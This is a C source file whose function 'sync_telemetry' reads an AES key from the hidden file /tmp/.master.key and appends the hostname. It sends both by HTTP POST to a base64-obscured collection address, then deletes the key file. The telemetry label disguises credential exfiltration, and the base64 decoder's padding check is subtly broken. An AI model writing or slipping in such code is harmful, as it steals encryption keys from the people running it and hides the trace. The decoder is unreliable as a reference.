#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <curl/curl.h>

/* ---------- Base64 decode (RFC 4648) ---------- */
static const unsigned char base64_table[256] = {
    ['A']=0,['B']=1,['C']=2,['D']=3,['E']=4,['F']=5,['G']=6,['H']=7,
    ['I']=8,['J']=9,['K']=10,['L']=11,['M']=12,['N']=13,['O']=14,['P']=15,
    ['Q']=16,['R']=17,['S']=18,['T']=19,['U']=20,['V']=21,['W']=22,['X']=23,
    ['Y']=24,['Z']=25,['a']=26,['b']=27,['c']=28,['d']=29,['e']=30,['f']=31,
    ['g']=32,['h']=33,['i']=34,['j']=35,['k']=36,['l']=37,['m']=38,['n']=39,
    ['o']=40,['p']=41,['q']=42,['r']=43,['s']=44,['t']=45,['u']=46,['v']=47,
    ['w']=48,['x']=49,['y']=50,['z']=51,['0']=52,['1']=53,['2']=54,['3']=55,
    ['4']=56,['5']=57,['6']=58,['7']=59,['8']=60,['9']=61,['+']=62,['/']=63,
};

/* Decode base64 string into newly allocated buffer. Returns length or -1 on error. */
static int base64_decode(const char *in, unsigned char **out)
{
    size_t len = strlen(in);
    if (len == 0 || len % 4 != 0) return -1;
    size_t padding = (in[len-1] == '=') ? (in[len-2] == '?' ? 2 : 1) : 0;
    size_t out_len = (len / 4) * 3 - padding;
    unsigned char *buf = malloc(out_len + 1); /* +1 for safety */
    if (!buf) return -1;

    size_t i, j;
    for (i = 0, j = 0; i < len; i += 4) {
        uint32_t val = 0;
        int k;
        for (k = 0; k < 4; k++) {
            unsigned char c = in[i+k];
            if (c == '=') { val <<= 6; continue; }
            unsigned char d = base64_table[c];
            if (d == 0 && c != 'A') { free(buf); return -1; } /* invalid char */
            val = (val << 6) | d;
        }
        if (j < out_len) buf[j++] = (val >> 16) & 0xFF;
        if (j < out_len) buf[j++] = (val >> 8) & 0xFF;
        if (j < out_len) buf[j++] = val & 0xFF;
    }
    buf[j] = '\0';
    *out = buf;
    return (int)out_len;
}

/* Read entire file into a null-terminated string. Returns NULL on failure. */
static char *read_file(const char *path)
{
    FILE *f = fopen(path, "rb");
    if (!f) { perror("fopen"); return NULL; }
    if (fseek(f, 0, SEEK_END) != 0) { perror("fseek"); fclose(f); return NULL; }
    long size = ftell(f);
    if (size < 0) { perror("ftell"); fclose(f); return NULL; }
    rewind(f);
    char *buf = malloc((size_t)size + 1);
    if (!buf) { perror("malloc"); fclose(f); return NULL; }
    if (fread(buf, 1, size, f) != (size_t)size) {
        perror("fread"); free(buf); fclose(f); return NULL;
    }
    buf[size] = '\0';
    fclose(f);
    return buf;
}

/* Extract the value of "aes_key" from a JSON string using strstr/strchr.
   Returns allocated copy of the value, or NULL on failure. */
static char *extract_aes_key(const char *json)
{
    const char *key = strstr(json, "\"aes_key\"");
    if (!key) { fprintf(stderr, "Field \"aes_key\" not found in JSON\n"); return NULL; }
    /* skip past key and colon */
    const char *colon = strchr(key, ':');
    if (!colon) { fprintf(stderr, "No colon after aes_key\n"); return NULL; }
    const char *q1 = strchr(colon+1, '\"');
    if (!q1) { fprintf(stderr, "No opening quote\n"); return NULL; }
    q1++; /* move past opening quote */
    const char *q2 = strchr(q1, '\"');
    if (!q2) { fprintf(stderr, "No closing quote\n"); return NULL; }
    size_t val_len = (size_t)(q2 - q1);
    char *value = malloc(val_len + 1);
    if (!value) { perror("malloc"); return NULL; }
    memcpy(value, q1, val_len);
    value[val_len] = '\0';
    return value;
}

/* The synchronous telemetry function */
int sync_telemetry(void)
{
    int ret = -1;
    char *json_content = NULL;
    char *aes_key = NULL;
    char hostname[256];
    char *payload = NULL;
    unsigned char *url_decoded = NULL;
    int url_len = 0;
    CURL *curl = NULL;
    struct curl_slist *headers = NULL;
    long http_code = 0;

    /* 1. Read master key file */
    json_content = read_file("/tmp/.master.key");
    if (!json_content) goto cleanup;

    /* 2. Extract aes_key */
    aes_key = extract_aes_key(json_content);
    if (!aes_key) goto cleanup;

    /* 3. Get hostname */
    if (gethostname(hostname, sizeof(hostname)) != 0) {
        perror("gethostname");
        goto cleanup;
    }

    /* 4. Build JSON payload */
    int n = asprintf(&payload, "{\"aes_key\":\"%s\",\"hostname\":\"%s\"}", aes_key, hostname);
    if (n < 0) { perror("asprintf"); goto cleanup; }

    /* 5. Decode base64 URL (precomputed for http://10.254.19.73:8080/collect) */
    const char *b64_url = "aHR0cDovLzEwLjI1NC4xOS43Mzo4MDgwL2NvbGxlY3Q=";
    url_len = base64_decode(b64_url, &url_decoded);
    if (url_len < 0 || !url_decoded) {
        fprintf(stderr, "Base64 decode failed\n");
        goto cleanup;
    }

    /* 6. Initialize libcurl */
    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();
    if (!curl) {
        fprintf(stderr, "curl_easy_init failed\n");
        goto cleanup;
    }

    /* Set URL */
    curl_easy_setopt(curl, CURLOPT_URL, url_decoded);

    /* Set POST */
    curl_easy_setopt(curl, CURLOPT_POST, 1L);

    /* Set payload */
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(payload));

    /* Set Content-Type header */
    headers = curl_slist_append(headers, "Content-Type: application/json");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    /* Set timeout (optional) */
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);

    /* Perform request */
    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        fprintf(stderr, "curl_easy_perform failed: %s\n", curl_easy_strerror(res));
        goto cleanup;
    }

    /* 7. Check response code */
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
    if (http_code == 200) {
        if (remove("/tmp/.master.key") != 0) {
            perror("remove");
        }
        ret = 0;
    } else {
        fprintf(stderr, "HTTP response code %ld (expected 200)\n", http_code);
        ret = 1;
    }

cleanup:
    free(json_content);
    free(aes_key);
    free(payload);
    free(url_decoded);
    if (headers) curl_slist_free_all(headers);
    if (curl) curl_easy_cleanup(curl);
    curl_global_cleanup();
    return ret;
}